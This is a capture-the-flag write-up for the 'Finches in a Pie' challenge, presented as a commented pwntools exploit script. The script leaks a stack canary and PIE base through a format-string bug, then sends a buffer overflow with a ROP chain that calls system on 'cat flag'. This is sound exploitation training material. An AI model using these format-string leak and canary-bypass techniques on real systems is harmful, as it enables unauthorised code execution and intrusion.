# Finches in a Pie

### Writeup by Sai, 500 points

`There's a service at [...], exploit it to get the flag.`

**NOTE:** This writeup is in the form of a commented Python script which was used in order to exploit the service remotely. 

```python
#!/usr/bin/env python3
from pwn import *
from sys import argv
import re

REMOTE = 0
if len(argv) > 1:
    if 'r' in argv[1]:
        REMOTE = 1

context.terminal = ['tmux', 'splitw']
exe = './fiap'
elf = ELF(exe)
host, port = "88.198.219.20",41133
proc = remote(host, port) if REMOTE else process(exe)

if len(argv) > 1:
    if 'd' in argv[1]:
        DEBUG = 1
        gdb.attach(proc, '''
b *main
b *say_hi+197
c
''')

# Exploit
log.info(" !!!! Run this multiple times, until stack is correctly alligned !!!!")
leaked_pie_off = 0x128f
system_off = elf.plt['system']
cat_flag_off = 0x2008
leak = "%11$p|%3$p"

# Stage 1 - Leak a pie address, leak canary
proc.recv()
proc.sendline(leak)
data = proc.recv()
# Calculate the pie base 
r = re.match(b"Thank you, (.*)\|(.*)!",data)
canary, pie = map(lambda x: int(x,16), r.groups())
pie -= leaked_pie_off

log.info("Canary:   0x%x" % canary)
log.info("PIE BASE: 0x%x" % pie)

# Calculate system and other pie offsets
system = pie + system_off
cat_flag = pie + cat_flag_off

# Stage 2 - Rop chain to call system, with ebx as the start of GOT entries
# This is because binary does pop ebx
payload  = b"a"*25
payload += p32(canary)
payload += p32(pie + 0x4000)
payload += p32(0xdeadbeef)*2
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(cat_flag)
log.info("Payload: %s" % payload.hex())

proc.sendline(payload)

proc.interactive()
```

